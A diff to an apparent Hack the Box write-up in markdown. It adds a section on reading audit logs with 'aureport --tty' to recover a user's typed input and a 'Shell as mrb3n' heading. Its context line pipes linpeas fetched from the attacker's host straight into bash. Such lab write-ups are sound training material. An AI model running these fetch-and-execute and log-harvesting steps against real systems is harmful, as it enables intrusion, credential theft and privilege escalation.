@@ -158,3 +158,11 @@ $ curl http://10.10.14.85:8000/linpeas.sh | bash
 Group `adm` is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group. Since the current user is a member of the `adm` group its a good idea to have a look at the logs (`/var/logs`).
 
 # Logs
+```CSS
+aureport --tty
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/36c12e1b-b565-4189-89c4-2a85895d964b)
+- That is just decoding what’s in these lines from /var/log/audit/audit.log.3
+
+# Shell as mrb3n
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/838bfc07-85e6-4bcb-8911-6d22b021221a)
